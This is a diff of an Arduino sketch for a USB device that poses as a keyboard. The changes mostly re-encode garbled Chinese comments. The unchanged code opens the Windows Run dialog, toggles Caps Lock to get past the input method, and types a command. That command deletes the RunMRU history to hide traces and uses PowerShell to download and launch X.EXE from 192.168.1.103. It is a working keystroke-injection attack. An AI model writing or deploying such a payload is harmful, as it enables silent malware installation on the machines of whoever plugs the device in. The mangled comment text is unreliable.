@@ -1,20 +1,20 @@
-void setup() {//³õÊ¼»¯
-  Keyboard.begin();//¿ªÊ¼¼üÅÌÍ¨Ñ¶ 
-  delay(5000);//ÑÓÊ±
-  Keyboard.press(KEY_LEFT_GUI);//win¼ü 
+void setup() {//åˆå§‹åŒ–
+  Keyboard.begin();//å¼€å§‹é”®ç›˜é€šè®¯ 
+  delay(5000);//å»¶æ—¶
+  Keyboard.press(KEY_LEFT_GUI);//æŒ‰ä¸‹winé”® 
   delay(500); 
-  Keyboard.press('r');//r¼ü 
+  Keyboard.press('r');//æŒ‰ä¸‹ré”® 
   delay(500); 
-  Keyboard.release(KEY_LEFT_GUI);
-  Keyboard.release('r');
-  Keyboard.press(KEY_CAPS_LOCK);//ÀûÓÃ¿ª´óĞ´ÊäĞ¡Ğ´ÈÆ¹ıÊäÈë·¨
+  Keyboard.release(KEY_LEFT_GUI);//é‡Šæ”¾winé”® 
+  Keyboard.release('r');//é‡Šæ”¾ré”® 
+  Keyboard.press(KEY_CAPS_LOCK);//åˆ©ç”¨å¼€å¤§å†™è¾“å°å†™ç»•è¿‡è¾“å…¥æ³•
   Keyboard.release(KEY_CAPS_LOCK);
   delay(500); 
   Keyboard.println("CMD /C START /MIN REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&CMD /C START /MIN POWERSHELL $P = nEW-oBJECT sYSTEM.nET.wEBcLIENT;$P.dOWNLOADfILE('HTTP://192.168.1.103/X.EXE', 'c:\\X.EXE');START c:\\X.EXE;EXIT");
-  Keyboard.press(KEY_CAPS_LOCK);
-  Keyboard.release(KEY_CAPS_LOCK);
-  Keyboard.end();//½áÊø¼üÅÌÍ¨Ñ¶ 
+  Keyboard.press(KEY_CAPS_LOCK);//æŒ‰ä¸‹å¤§å†™
+  Keyboard.release(KEY_CAPS_LOCK);//æ•´ä¸ªè¿‡ç¨‹å…³é—­å¤§å†™é”å®š
+  Keyboard.end();//ç»“æŸé”®ç›˜é€šè®¯ 
 }
-void loop()//Ñ­»·
+void loop()//å¾ªç¯
 {
 }
